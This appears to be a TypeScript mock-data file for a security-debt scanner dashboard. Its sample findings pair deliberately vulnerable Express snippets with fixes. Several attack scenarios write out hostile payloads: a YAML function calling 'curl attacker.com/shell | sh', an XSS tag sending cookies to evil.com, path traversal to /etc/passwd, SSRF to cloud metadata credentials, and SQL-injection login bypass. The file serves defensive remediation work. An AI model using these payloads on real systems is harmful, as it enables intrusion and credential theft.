import {
  Scan,
  Finding,
  DependencyIssue,
  SecretFinding,
  ConfigurationIssue,
  DebtLedgerRow,
  FolderDebt,
  OwaspDistribution
} from '../types'

export const mockCurrentScan: Scan = {
  id: 'scan_exp_8892',
  repoName: 'express-api',
  source: 'github',
  branch: 'main',
  status: 'complete',
  score: 62,
  grade: 'D',
  debtHours: 41,
  riskLevel: 'Critical',
  startedAt: new Date(Date.now() - 14 * 60 * 1000).toISOString(),
  durationSeconds: 151, // 2m 31s
  linesOfCode: 18742,
  languages: ['JavaScript', 'TypeScript']
}

export const mockDebtLedger: DebtLedgerRow[] = [
  { severity: 'Critical', issues: 3, hoursToFix: 14, shareOfDebt: 34 },
  { severity: 'High', issues: 8, hoursToFix: 18, shareOfDebt: 44 },
  { severity: 'Medium', issues: 9, hoursToFix: 7, shareOfDebt: 17 },
  { severity: 'Low', issues: 6, hoursToFix: 2, shareOfDebt: 5 }
]

export const mockFolderDebts: FolderDebt[] = [
  { folder: 'server/config', hours: 10, issueCount: 4 },
  { folder: 'src/routes', hours: 9, issueCount: 6 },
  { folder: 'server/middleware', hours: 7, issueCount: 4 },
  { folder: 'src/handlers', hours: 5, issueCount: 2 },
  { folder: 'src/models', hours: 4, issueCount: 2 },
  { folder: 'src/controllers', hours: 3, issueCount: 2 },
  { folder: 'src/services', hours: 2, issueCount: 3 },
  { folder: 'src/utils', hours: 1, issueCount: 3 }
]

export const mockOwaspDistribution: OwaspDistribution[] = [
  { category: 'A03:2021-Injection', count: 6, hours: 12 },
  { category: 'A01:2021-Broken Access Control', count: 5, hours: 9 },
  { category: 'A02:2021-Cryptographic Failures', count: 5, hours: 8 },
  { category: 'A07:2021-Identification & Auth', count: 4, hours: 5 },
  { category: 'A05:2021-Security Misconfiguration', count: 4, hours: 4 },
  { category: 'A06:2021-Vulnerable Components', count: 2, hours: 3 }
]

export const mockPastScans: Scan[] = [
  {
    id: 'scan_001',
    repoName: 'express-api',
    source: 'github',
    branch: 'main',
    status: 'complete',
    score: 44,
    grade: 'F',
    debtHours: 74,
    riskLevel: 'Critical',
    startedAt: '2026-06-12T09:15:00Z',
    durationSeconds: 168,
    linesOfCode: 16420,
    languages: ['JavaScript', 'TypeScript']
  },
  {
    id: 'scan_002',
    repoName: 'express-api',
    source: 'github',
    branch: 'main',
    status: 'complete',
    score: 51,
    grade: 'D',
    debtHours: 61,
    riskLevel: 'Critical',
    startedAt: '2026-07-24T14:30:00Z',
    durationSeconds: 159,
    linesOfCode: 17110,
    languages: ['JavaScript', 'TypeScript']
  },
  {
    id: 'scan_003',
    repoName: 'express-api',
    source: 'github',
    branch: 'main',
    status: 'complete',
    score: 55,
    grade: 'D',
    debtHours: 54,
    riskLevel: 'Critical',
    startedAt: '2026-08-30T11:20:00Z',
    durationSeconds: 154,
    linesOfCode: 17850,
    languages: ['JavaScript', 'TypeScript']
  },
  {
    id: 'scan_004',
    repoName: 'express-api',
    source: 'github',
    branch: 'main',
    status: 'complete',
    score: 58,
    grade: 'D',
    debtHours: 48,
    riskLevel: 'Critical',
    startedAt: '2026-09-28T16:45:00Z',
    durationSeconds: 150,
    linesOfCode: 18320,
    languages: ['JavaScript', 'TypeScript']
  },
  {
    ...mockCurrentScan
  }
]

export const mockFindings: Finding[] = [
  // 1. SQL Injection (Critical)
  {
    id: 'f-001',
    scanId: 'scan_exp_8892',
    title: 'SQL injection in authentication query',
    severity: 'Critical',
    category: 'Injection',
    cwe: 'CWE-89',
    owasp: 'A03:2021',
    filePath: 'src/routes/auth.js',
    lineStart: 45,
    lineEnd: 52,
    codeSnippet: `// Untrusted user input concatenated directly into raw SQL
const { email, password } = req.body;
const query = "SELECT * FROM users WHERE email = '" + email + "' AND password = '" + password + "'";
const [rows] = await db.raw(query);
if (rows.length > 0) {
  return issueAuthToken(rows[0]);
}`,
    description: 'Raw SQL query string constructed via direct string concatenation using untrusted request body parameters (email and password). An unauthenticated attacker can supply malicious SQL sequences to bypass authentication or extract sensitive customer records.',
    attackScenario: 'An attacker submits `admin\' OR \'1\'=\'1` in the email parameter. The resulting query executes as `SELECT * FROM users WHERE email = \'admin\' OR \'1\'=\'1\' AND ...`, evaluating to true and logging the attacker into the first administrative account without a valid password.',
    aiFix: {
      before: `const query = "SELECT * FROM users WHERE email = '" + email + "' AND password = '" + password + "';\nconst [rows] = await db.raw(query);`,
      after: `const [rows] = await db.query(\n  'SELECT * FROM users WHERE email = $1 AND password_hash = $2',\n  [email, hashedPassword]\n);`,
      explanation: 'Replaced dynamic string concatenation with parameterized prepared statements, preventing SQL metacharacters in input from altering the intended AST query structure.'
    },
    effortHours: 3,
    pointsGainedIfFixed: 6,
    status: 'Open',
    detectedAt: '2026-10-31T06:36:00Z',
    notes: 'Requires coordination with database migration to ensure bcrypt comparison instead of direct SQL password comparison.'
  },

  // 2. Hardcoded AWS access key (Critical)
  {
    id: 'f-002',
    scanId: 'scan_exp_8892',
    title: 'Hardcoded AWS access key in cloud storage config',
    severity: 'Critical',
    category: 'Security Misconfiguration',
    cwe: 'CWE-798',
    owasp: 'A05:2021',
    filePath: 'server/config/storage.js',
    lineStart: 6,
    lineEnd: 12,
    codeSnippet: `const s3Client = new S3Client({
  region: 'us-east-1',
  credentials: {
    accessKeyId: 'AKIAIOSFODNN7EXAMPLE',
    secretAccessKey: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'
  }
});`,
    description: 'High-privilege AWS IAM credentials committed directly to version control. Committed access keys are exposed to anyone with repo read access and may be scraped by botnets if cloned to public mirrors or included in client artifacts.',
    attackScenario: 'An attacker obtaining repository access extracts the IAM access key and utilizes AWS CLI tools to enumerate S3 buckets, alter customer data, or spawn unauthorized EC2 cryptocurrency mining instances.',
    aiFix: {
      before: `credentials: {\n  accessKeyId: 'AKIAIOSFODNN7EXAMPLE',\n  secretAccessKey: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'\n}`,
      after: `// Retrieve credentials from environment variables or AWS IAM Role\ncredentials: {\n  accessKeyId: process.env.AWS_ACCESS_KEY_ID!,\n  secretAccessKey: process.env.AWS_SECRET_ACCESS_KEY!\n}`,
      explanation: 'Extracted secret keys from codebase into runtime environment variables; recommended switching to AWS IAM Instance Profiles or ECS Task Roles in production.'
    },
    effortHours: 2,
    pointsGainedIfFixed: 5,
    status: 'Open',
    detectedAt: '2026-10-31T06:36:00Z',
    notes: 'Key must be rotated immediately in AWS IAM before closing this issue.'
  },

  // 3. Remote Code Execution via unsafe deserialization (Critical)
  {
    id: 'f-003',
    scanId: 'scan_exp_8892',
    title: 'Remote code execution via unsafe YAML deserialization',
    severity: 'Critical',
    category: 'Injection',
    cwe: 'CWE-502',
    owasp: 'A08:2021',
    filePath: 'src/handlers/import.js',
    lineStart: 80,
    lineEnd: 86,
    codeSnippet: `const yaml = require('js-yaml');

function parseUploadedConfig(rawString) {
  // Uses load without safe schema restrictions
  return yaml.load(rawString);
}`,
    description: 'YAML parser invoked with custom object constructor instantiations enabled. Unchecked user-submitted YAML documents can trigger arbitrary JavaScript function execution during deserialization.',
    attackScenario: 'An attacker uploads a YAML document containing `!!js/function > function(){ child_process.exec("curl attacker.com/shell | sh") }` which evaluates on server during import processing.',
    aiFix: {
      before: `return yaml.load(rawString);`,
      after: `// Enforce strict schema with no function execution\nreturn yaml.load(rawString, { schema: yaml.JSON_SCHEMA });`,
      explanation: 'Constrained js-yaml parser to JSON_SCHEMA, completely forbidding JavaScript function execution and prototype poisoning during deserialization.'
    },
    effortHours: 4,
    pointsGainedIfFixed: 5,
    status: 'Open',
    detectedAt: '2026-10-31T06:36:00Z',
    notes: 'Team verified import schema only requires standard strings and booleans.'
  },

  // 4. Stored XSS (High)
  {
    id: 'f-004',
    scanId: 'scan_exp_8892',
    title: 'Stored cross-site scripting in discussion comments',
    severity: 'High',
    category: 'Injection',
    cwe: 'CWE-79',
    owasp: 'A03:2021',
    filePath: 'src/routes/comments.js',
    lineStart: 110,
    lineEnd: 116,
    codeSnippet: `router.post('/comments', async (req, res) => {
  const { threadId, commentHtml } = req.body;
  // Stored raw into database without sanitization
  const record = await Comment.create({ threadId, content: commentHtml });
  res.json({ success: true, id: record.id });
});`,
    description: 'User-provided HTML strings are persisted directly into the database without sanitization and subsequently rendered unescaped into other users browsers.',
    attackScenario: 'A malicious user leaves a comment containing `<img src=x onerror="fetch(\'https://evil.com/steal?c=\'+document.cookie)">`. When administrative operators view the moderation thread, their session tokens are exfiltrated.',
    aiFix: {
      before: `const record = await Comment.create({ threadId, content: commentHtml });`,
      after: `import DOMPurify from 'isomorphic-dompurify';\nconst cleanHtml = DOMPurify.sanitize(commentHtml);\nconst record = await Comment.create({ threadId, content: cleanHtml });`,
      explanation: 'Integrated DOMPurify to strip malicious script vectors, event handlers, and unauthorized iframe tags while permitting safe formatting tags.'
    },
    effortHours: 1.5,
    pointsGainedIfFixed: 2,
    status: 'Open',
    detectedAt: '2026-10-31T06:36:00Z',
    notes: ''
  },

  // 5. Insecure JWT HS256 with weak secret (High)
  {
    id: 'f-005',
    scanId: 'scan_exp_8892',
    title: 'Insecure JWT signed using HS256 with weak secret',
    severity: 'High',
    category: 'Cryptographic Failures',
    cwe: 'CWE-327',
    owasp: 'A02:2021',
    filePath: 'server/middleware/auth.js',
    lineStart: 26,
    lineEnd: 34,
    codeSnippet: `const jwt = require('jsonwebtoken');
const SECRET = 'secret123'; // Weak symmetric key

function generateToken(payload) {
  return jwt.sign(payload, SECRET, { algorithm: 'HS256', expiresIn: '7d' });
}`,
    description: 'JSON Web Tokens signed using a low-entropy trivial secret key (`secret123`). Attackers can brute-force symmetric tokens offline within seconds to forge administrative authorization claims.',
    attackScenario: 'An attacker captures a valid JWT from HTTP headers, executes John the Ripper or Hashcat with standard dictionary lists, cracks the secret in under 5 seconds, and mints an arbitrary token with `role: "superuser"`.',
    aiFix: {
      before: `const SECRET = 'secret123';\nreturn jwt.sign(payload, SECRET, { algorithm: 'HS256', expiresIn: '7d' });`,
      after: `const JWT_SECRET = process.env.JWT_SIGNING_KEY;\nif (!JWT_SECRET || JWT_SECRET.length < 32) throw new Error('Unsafe JWT secret');\nreturn jwt.sign(payload, JWT_SECRET, { algorithm: 'HS256', expiresIn: '2h' });`,
      explanation: 'Enforced cryptographic secret retrieval from environment configuration with 256-bit entropy check and decreased default expiration duration.'
    },
    effortHours: 1,
    pointsGainedIfFixed: 2,
    status: 'Open',
    detectedAt: '2026-10-31T06:36:00Z',
    notes: 'Token lifetime should also be lowered from 7 days to 2 hours.'
  },

  // 6. MD5 used for password hashing (High)
  {
    id: 'f-006',
    scanId: 'scan_exp_8892',
    title: 'MD5 algorithm utilized for password hashing',
    severity: 'High',
    category: 'Cryptographic Failures',
    cwe: 'CWE-916',
    owasp: 'A02:2021',
    filePath: 'src/models/user.js',
    lineStart: 29,
    lineEnd: 35,
    codeSnippet: `const crypto = require('crypto');

UserSchema.methods.setPassword = function(password) {
  // MD5 has known collision and pre-image weaknesses
  this.passwordHash = crypto.createHash('md5').update(password).digest('hex');
};`,
    description: 'Weak legacy hashing algorithm MD5 utilized without salt for credentials. Precomputed rainbow tables exist for all common MD5 password variations, enabling instant recovery of plaintext passwords in database breach events.',
    attackScenario: 'In a database dump leak, an adversary queries rainbow table online databases for the MD5 digests and recovers over 90% of user passwords without computational cost.',
    aiFix: {
      before: `this.passwordHash = crypto.createHash('md5').update(password).digest('hex');`,
      after: `import argon2 from 'argon2';\nthis.passwordHash = await argon2.hash(password, { type: argon2.argon2id });`,
      explanation: 'Replaced broken non-salted MD5 hash with Argon2id memory-hard key derivation function.'
    },
    effortHours: 3,
    pointsGainedIfFixed: 3,
    status: 'Open',
    detectedAt: '2026-10-31T06:36:00Z',
    notes: 'Requires password upgrade hook upon subsequent successful login.'
  },

  // 7. Path traversal in file reader (High)
  {
    id: 'f-007',
    scanId: 'scan_exp_8892',
    title: 'Directory path traversal in export file retrieval',
    severity: 'High',
    category: 'Broken Access Control',
    cwe: 'CWE-22',
    owasp: 'A01:2021',
    filePath: 'src/routes/files.js',
    lineStart: 66,
    lineEnd: 73,
    codeSnippet: `router.get('/download', (req, res) => {
  const fileName = req.query.file;
  // Missing path traversal validation
  const filePath = path.join(__dirname, '../../uploads', fileName);
  res.sendFile(filePath);
});`,
    description: 'Path traversal parameter flaw enables users to break out of the intended uploads directory using relative path dot-dot-slash sequences (`../`).',
    attackScenario: 'An attacker requests `GET /download?file=../../../../etc/passwd` or `GET /download?file=../../.env` to download application environment configurations and host server files.',
    aiFix: {
      before: `const filePath = path.join(__dirname, '../../uploads', fileName);\nres.sendFile(filePath);`,
      after: `const safeBase = path.resolve(__dirname, '../../uploads');\nconst targetPath = path.resolve(safeBase, fileName);\nif (!targetPath.startsWith(safeBase)) {\n  return res.status(403).json({ error: 'Access denied' });\n}\nres.sendFile(targetPath);`,
      explanation: 'Verified target path strictly resides within designated upload directory boundary using canonical path verification.'
    },
    effortHours: 2,
    pointsGainedIfFixed: 2,
    status: 'Open',
    detectedAt: '2026-10-31T06:36:00Z',
    notes: ''
  },

  // 8. SSRF in Webhook caller (High)
  {
    id: 'f-008',
    scanId: 'scan_exp_8892',
    title: 'Server-side request forgery in webhook dispatcher',
    severity: 'High',
    category: 'Security Misconfiguration',
    cwe: 'CWE-918',
    owasp: 'A10:2021',
    filePath: 'src/services/webhook.js',
    lineStart: 50,
    lineEnd: 56,
    codeSnippet: `async function dispatchWebhook(targetUrl, payload) {
  // Makes direct HTTP request to user-supplied endpoint without IP validation
  return axios.post(targetUrl, payload, { timeout: 3000 });
}`,
    description: 'The server makes direct outbound HTTP calls to arbitrary URLs provided by tenants without validating whether the resolved IP addresses target internal subnets or cloud metadata APIs.',
    attackScenario: 'A tenant sets their webhook destination to `http://169.254.169.254/latest/meta-data/iam/security-credentials/`, causing the worker node to deliver cloud provider instance credentials in the webhook response logs.',
    aiFix: {
      before: `return axios.post(targetUrl, payload, { timeout: 3000 });`,
      after: `import { validateSafeOutboundUrl } from '../utils/ssrfValidator';\nawait validateSafeOutboundUrl(targetUrl); // checks private IP range & loopback\nreturn axios.post(targetUrl, payload, { timeout: 3000 });`,
      explanation: 'Added DNS resolution checks to block private, link-local, loopback, and cloud metadata (169.254.x) IP ranges.'
    },
    effortHours: 3,
    pointsGainedIfFixed: 2,
    status: 'Open',
    detectedAt: '2026-10-31T06:36:00Z',
    notes: ''
  },

  // 9. Unrestricted file upload (High)
  {
    id: 'f-009',
    scanId: 'scan_exp_8892',
    title: 'Unrestricted file upload with executable extensions',
    severity: 'High',
    category: 'Broken Access Control',
    cwe: 'CWE-434',
    owasp: 'A01:2021',
    filePath: 'src/controllers/upload.ts',
    lineStart: 42,
    lineEnd: 49,
    codeSnippet: `const storage = multer.diskStorage({
  destination: 'public/uploads/',
  filename: (req, file, cb) => {
    // Preserves original extension without mime-type verification
    cb(null, Date.now() + '-' + file.originalname);
  }
});`,
    description: 'Files are saved to publicly web-accessible folders while retaining raw user-specified extensions without validating magic file signatures.',
    attackScenario: 'An attacker uploads `shell.php` or `exploit.html`. When browsed via the static server, executable scripts run in server or target browser contexts.',
    aiFix: {
      before: `cb(null, Date.now() + '-' + file.originalname);`,
      after: `const allowedMimes = ['image/jpeg', 'image/png', 'application/pdf'];\nif (!allowedMimes.includes(file.mimetype)) throw new Error('Unsupported format');\nconst ext = mime.extension(file.mimetype);\ncb(null, \`\${crypto.randomUUID()}.\${ext}\`);`,
      explanation: 'Generated deterministic UUID filenames with whitelisted extension mappings based on validated MIME types.'
    },
    effortHours: 2.5,
    pointsGainedIfFixed: 2,
    status: 'Open',
    detectedAt: '2026-10-31T06:36:00Z',
    notes: ''
  },

  // 10. BOLA in accounts (High)
  {
    id: 'f-010',
    scanId: 'scan_exp_8892',
    title: 'Broken object level authorization on billing accounts',
    severity: 'High',
    category: 'Broken Access Control',
    cwe: 'CWE-639',
    owasp: 'A01:2021',
    filePath: 'src/routes/accounts.js',
    lineStart: 90,
    lineEnd: 97,
    codeSnippet: `router.get('/accounts/:accountId/billing', async (req, res) => {
  // Looks up account by parameter without validating logged in user owns it
  const account = await db.BillingAccount.findByPk(req.params.accountId);
  res.json(account);
});`,
    description: 'Endpoint fetches billing account data using the route parameter directly without checking if the authenticated user has tenant association with the record.',
    attackScenario: 'A regular user changes `accountId` in the URL from `1001` to `1002` and reads invoices, payment card types, and contact details of competitor accounts.',
    aiFix: {
      before: `const account = await db.BillingAccount.findByPk(req.params.accountId);`,
      after: `const account = await db.BillingAccount.findOne({\n  where: { id: req.params.accountId, organizationId: req.user.organizationId }\n});\nif (!account) return res.status(404).json({ error: 'Account not found' });`,
      explanation: 'Scoped SQL lookup query by authenticated user organization identifier.'
    },
    effortHours: 2,
    pointsGainedIfFixed: 2,
    status: 'In progress',
    detectedAt: '2026-10-31T06:36:00Z',
    notes: 'In progress by security guild.'
  },

  // 11. Missing authorization check on admin export (High)
  {
    id: 'f-011',
    scanId: 'scan_exp_8892',
    title: 'Missing authorization check on administrative audit export',
    severity: 'High',
    category: 'Broken Access Control',
    cwe: 'CWE-285',
    owasp: 'A01:2021',
    filePath: 'src/routes/admin.js',
    lineStart: 138,
    lineEnd: 145,
    codeSnippet: `router.get('/admin/export-audit', authenticateJwt, async (req, res) => {
  // Missing requireRole('admin') middleware check
  const audits = await AuditLog.findAll({ limit: 10000 });
  res.attachment('system-audit.csv').send(generateCsv(audits));
});`,
    description: 'Sensitive administrative export route checks only that a user is logged in, but fails to check whether their role includes administrative rights.',
    attackScenario: 'Any authenticated standard user visits `/admin/export-audit` and downloads the complete corporate security audit trail.',
    aiFix: {
      before: `router.get('/admin/export-audit', authenticateJwt, async (req, res) => {`,
      after: `router.get('/admin/export-audit', authenticateJwt, requireRole('admin'), async (req, res) => {`,
      explanation: 'Appended RBAC role verification middleware before invoking handler logic.'
    },
    effortHours: 1,
    pointsGainedIfFixed: 1,
    status: 'Open',
    detectedAt: '2026-10-31T06:36:00Z',
    notes: ''
  },

  // 12. Missing rate limiting on login (Medium)
  {
    id: 'f-012',
    scanId: 'scan_exp_8892',
    title: 'Missing rate limiting on authentication login endpoint',
    severity: 'Medium',
    category: 'Identification & Auth',
    cwe: 'CWE-307',
    owasp: 'A07:2021',
    filePath: 'src/app.js',
    lineStart: 56,
    lineEnd: 62,
    codeSnippet: `app.use('/api/v1/auth', authRouter);
// No express-rate-limit middleware applied here`,
    description: 'The authentication routes permit unlimited repeated POST attempts without IP or account-level throttling, allowing automated credential stuffing and brute force attempts.',
    attackScenario: 'Adversaries launch credential stuffing dictionaries against `/api/v1/auth/login` at 500 requests per second with zero throttling or IP bans.',
    aiFix: {
      before: `app.use('/api/v1/auth', authRouter);`,
      after: `import rateLimit from 'express-rate-limit';\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 10, standardHeaders: true });\napp.use('/api/v1/auth/login', loginLimiter);\napp.use('/api/v1/auth', authRouter);`,
      explanation: 'Mounted express-rate-limit configured for maximum 10 failed attempts per 15-minute window.'
    },
    effortHours: 1,
    pointsGainedIfFixed: 1,
    status: 'Open',
    detectedAt: '2026-10-31T06:36:00Z',
    notes: ''
  },

  // 13. CORS wildcard origin (Medium)
  {
    id: 'f-013',
    scanId: 'scan_exp_8892',
    title: 'CORS wildcard origin allows arbitrary third-party read access',
    severity: 'Medium',
    category: 'Security Misconfiguration',
    cwe: 'CWE-942',
    owasp: 'A05:2021',
    filePath: 'server/middleware/cors.ts',
    lineStart: 12,
    lineEnd: 18,
    codeSnippet: `export const corsOptions = {
  origin: '*',
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE']
};`,
    description: 'CORS configuration sets wildcard `origin: "*"` alongside `credentials: true`. This permits arbitrary domains visited by an authenticated user to perform requests and read API responses.',
    attackScenario: 'An attacker tricks an authenticated company employee into visiting a malicious site, which initiates JavaScript cross-origin requests to read private company reports.',
    aiFix: {
      before: `origin: '*',`,
      after: `origin: ['https://app.secdebt.internal', 'https://staging.secdebt.internal'],`,
      explanation: 'Restricted CORS origin strictly to verified company domains.'
    },
    effortHours: 0.5,
    pointsGainedIfFixed: 1,
    status: 'Open',
    detectedAt: '2026-10-31T06:36:00Z',
    notes: ''
  },

  // 14. Prototype pollution in merge (Medium)
  {
    id: 'f-014',
    scanId: 'scan_exp_8892',
    title: 'Prototype pollution via user-supplied nested object keys',
    severity: 'Medium',
    category: 'Injection',
    cwe: 'CWE-1321',
    owasp: 'A03:2021',
    filePath: 'src/utils/merge.js',
    lineStart: 21,
    lineEnd: 27,
    codeSnippet: `function deepMerge(target, source) {
  for (let key of Object.keys(source)) {
    if (source[key] instanceof Object) {
      if (!target[key]) target[key] = {};
      deepMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}`,
    description: 'Recursive object merger fails to sanitize `__proto__` or `constructor.prototype` keys, permitting attackers to inject properties into Object prototype.',
    attackScenario: 'Submitting payload `{"__proto__": {"isAdmin": true}}` causes subsequent object lookups in the application to evaluate `user.isAdmin` as true.',
    aiFix: {
      before: `for (let key of Object.keys(source)) {`,
      after: `for (let key of Object.keys(source)) {\n    if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue;`,
      explanation: 'Added guard statement disallowing mutation of prototype and constructor properties during traversal.'
    },
    effortHours: 1,
    pointsGainedIfFixed: 1,
    status: 'Open',
    detectedAt: '2026-10-31T06:36:00Z',
    notes: ''
  },

  // 15. ReDoS in email validator (Medium)
  {
    id: 'f-015',
    scanId: 'scan_exp_8892',
    title: 'Regular expression denial of service in email validator',
    severity: 'Medium',
    category: 'Security Misconfiguration',
    cwe: 'CWE-1333',
    owasp: 'A05:2021',
    filePath: 'src/utils/validators.js',
    lineStart: 10,
    lineEnd: 15,
    codeSnippet: `// Catastrophic polynomial backtracking regex
export const EMAIL_REGEX = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

export function isValidEmail(email) {
  return EMAIL_REGEX.test(email);
}`,
    description: 'Nested quantifiers `+` on grouped capturing expressions cause catastrophic exponential backtracking when matching long invalid input strings.',
    attackScenario: 'An attacker posts an email string with 40 repetitions of `a-` followed by an exclamation point, blocking the Node event loop for several minutes.',
    aiFix: {
      before: `export const EMAIL_REGEX = /^([a-zA-Z0-9_\\.\\-])+\\@(([a-zA-Z0-9\\-])+\\.)+([a-zA-Z0-9]{2,4})+$/;`,
      after: `import validator from 'validator';\nexport function isValidEmail(email: string) {\n  return validator.isEmail(email, { allow_utf8_local_part: false });\n}`,
      explanation: 'Replaced custom backtracking regular expression with standard tested validator library parser.'
    },
    effortHours: 0.5,
    pointsGainedIfFixed: 1,
    status: 'Open',
    detectedAt: '2026-10-31T06:36:00Z',
    notes: ''
  },

  // 16. Insecure cookie flag (Medium)
  {
    id: 'f-016',
    scanId: 'scan_exp_8892',
    title: 'Session cookie missing HttpOnly and Secure flags',
    severity: 'Medium',
    category: 'Identification & Auth',
    cwe: 'CWE-1004',
    owasp: 'A07:2021',
    filePath: 'src/app.js',
    lineStart: 75,
    lineEnd: 81,
    codeSnippet: `app.use(session({
  secret: process.env.SESSION_SECRET,
  cookie: {
    secure: false, // Sent over plain HTTP
    httpOnly: false // Accessible to document.cookie
  }
}));`,
    description: 'Cookies storing active session identifiers lack HttpOnly and Secure flags, making them vulnerable to JavaScript theft during minor XSS events or interception across unencrypted networks.',
    attackScenario: 'Any temporary client-side script tag can read `document.cookie` directly and hijack user sessions.',
    aiFix: {
      before: `cookie: {\n    secure: false,\n    httpOnly: false\n  }`,
      after: `cookie: {\n    secure: process.env.NODE_ENV === 'production',\n    httpOnly: true,\n    sameSite: 'lax'\n  }`,
      explanation: 'Enabled HttpOnly to block script access, Secure to enforce HTTPS transport, and SameSite Lax to mitigate CSRF.'
    },
    effortHours: 0.5,
    pointsGainedIfFixed: 1,
    status: 'Open',
    detectedAt: '2026-10-31T06:36:00Z',
    notes: ''
  },

  // 17. Verbose error stack traces leaked (Medium)
  {
    id: 'f-017',
    scanId: 'scan_exp_8892',
    title: 'Verbose internal error stack traces leaked in HTTP responses',
    severity: 'Medium',
    category: 'Security Misconfiguration',
    cwe: 'CWE-209',
    owasp: 'A05:2021',
    filePath: 'server/middleware/error.ts',
    lineStart: 18,
    lineEnd: 24,
    codeSnippet: `export function errorHandler(err, req, res, next) {
  res.status(err.status || 500).json({
    message: err.message,
    stack: err.stack, // Exposes internal directory structures
    query: req.body
  });
}`,
    description: 'Unhandled exceptions return raw JavaScript stack traces disclosing internal operating system directories, third-party libraries, and database column names.',
    attackScenario: 'An attacker intentionally triggers type errors to map filesystem layouts and internal microservice names.',
    aiFix: {
      before: `stack: err.stack,`,
      after: `stack: process.env.NODE_ENV === 'development' ? err.stack : undefined,`,
      explanation: 'Filtered out stack traces in non-development runtime environments.'
    },
    effortHours: 0.5,
    pointsGainedIfFixed: 1,
    status: 'Open',
    detectedAt: '2026-10-31T06:36:00Z',
    notes: ''
  },

  // 18. Missing CSRF validation (Medium)
  {
    id: 'f-018',
    scanId: 'scan_exp_8892',
    title: 'Missing CSRF validation on profile mutation endpoints',
    severity: 'Medium',
    category: 'Broken Access Control',
    cwe: 'CWE-352',
    owasp: 'A01:2021',
    filePath: 'src/routes/profile.js',
    lineStart: 62,
    lineEnd: 69,
    codeSnippet: `router.post('/update-email', async (req, res) => {
  const { newEmail } = req.body;
  await User.update({ email: newEmail }, { where: { id: req.user.id } });
  res.json({ status: 'updated' });
});`,
    description: 'State-altering POST endpoint relies purely on ambient browser session cookies without verifying custom anti-CSRF headers.',
    attackScenario: 'A user opens an external forum post with an embedded auto-submitting form targeting `/update-email`, stealthily repointing user password reset emails to an adversary inbox.',
    aiFix: {
      before: `router.post('/update-email', async (req, res) => {`,
      after: `router.post('/update-email', csrfProtection, async (req, res) => {`,
      explanation: 'Bound double-submit CSRF token validation middleware.'
    },
    effortHours: 1.5,
    pointsGainedIfFixed: 1,
    status: 'Open',
    detectedAt: '2026-10-31T06:36:00Z',
    notes: ''
  },

  // 19. Open redirect (Medium)
  {
    id: 'f-019',
    scanId: 'scan_exp_8892',
    title: 'Open redirect in external OAuth callback handler',
    severity: 'Medium',
    category: 'Broken Access Control',
    cwe: 'CWE-601',
    owasp: 'A01:2021',
    filePath: 'src/routes/oauth.js',
    lineStart: 36,
    lineEnd: 42,
    codeSnippet: `router.get('/callback', async (req, res) => {
  const returnUrl = req.query.return_to || '/dashboard';
  // Unvalidated redirect
  res.redirect(returnUrl);
});`,
    description: 'Application redirects user browsers to an unvalidated URL specified in the query string parameter upon authentication completion.',
    attackScenario: 'An attacker sends a phishing link `https://app.secdebt.internal/oauth/callback?return_to=https://evil-phish.com`. Users trust the initial corporate domain and submit credentials on the malicious landing page.',
    aiFix: {
      before: `res.redirect(returnUrl);`,
      after: `const isRelative = returnUrl.startsWith('/') && !returnUrl.startsWith('//');\nres.redirect(isRelative ? returnUrl : '/dashboard');`,
      explanation: 'Enforced relative-only paths, blocking external host scheme redirections.'
    },
    effortHours: 0.5,
    pointsGainedIfFixed: 1,
    status: 'Open',
    detectedAt: '2026-10-31T06:36:00Z',
    notes: ''
  },

  // 20. Information disclosure PII in logs (Medium)
  {
    id: 'f-020',
    scanId: 'scan_exp_8892',
    title: 'Unmasked customer PII written to server application logs',
    severity: 'Medium',
    category: 'Cryptographic Failures',
    cwe: 'CWE-532',
    owasp: 'A09:2021',
    filePath: 'src/services/audit.ts',
    lineStart: 87,
    lineEnd: 93,
    codeSnippet: `export function logTransaction(user, paymentDetails) {
  logger.info({
    userId: user.id,
    pan: paymentDetails.cardNumber, // Unmasked card PAN
    ssn: user.ssn
  }, 'Transaction processed');
}`,
    description: 'Customer payment card numbers and government identifiers written unmasked to centralized logging sinks, violating PCI-DSS requirements.',
    attackScenario: 'Engineers or compromised logging dashboards gain cleartext visibility into customer financial information.',
    aiFix: {
      before: `pan: paymentDetails.cardNumber,\n    ssn: user.ssn`,
      after: `pan: maskPan(paymentDetails.cardNumber),\n    ssn: '***-**-' + user.ssn.slice(-4)`,
      explanation: 'Introduced masking utility to truncate sensitive identifiers to last 4 characters prior to log emission.'
    },
    effortHours: 1,
    pointsGainedIfFixed: 1,
    status: 'Open',
    detectedAt: '2026-10-31T06:36:00Z',
    notes: ''
  },

  // 21. Debug mode enabled in production (Low)
  {
    id: 'f-021',
    scanId: 'scan_exp_8892',
    title: 'Debug mode enabled in production configuration file',
    severity: 'Low',
    category: 'Security Misconfiguration',
    cwe: 'CWE-489',
    owasp: 'A05:2021',
    filePath: 'config/prod.env',
    lineStart: 5,
    lineEnd: 8,
    codeSnippet: `NODE_ENV=production
PORT=8080
DEBUG=express:*,app:*
LOG_LEVEL=debug`,
    description: 'Verbose framework debugging flags left turned on inside the production environment template file.',
    attackScenario: 'Debug log outputs consume high disk I/O and may echo raw request payloads into standard out.',
    aiFix: {
      before: `DEBUG=express:*,app:*\nLOG_LEVEL=debug`,
      after: `DEBUG=\nLOG_LEVEL=info`,
      explanation: 'Disabled debug verbosity and set default production log level to info.'
    },
    effortHours: 0.25,
    pointsGainedIfFixed: 0.5,
    status: 'Open',
    detectedAt: '2026-10-31T06:36:00Z',
    notes: ''
  },

  // 22. Missing X-Content-Type-Options (Low)
  {
    id: 'f-022',
    scanId: 'scan_exp_8892',
    title: 'Missing X-Content-Type-Options nosniff header',
    severity: 'Low',
    category: 'Security Misconfiguration',
    cwe: 'CWE-16',
    owasp: 'A05:2021',
    filePath: 'server/middleware/security.js',
    lineStart: 14,
    lineEnd: 18,
    codeSnippet: `// Security headers missing nosniff directive
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'DENY');
  next();
});`,
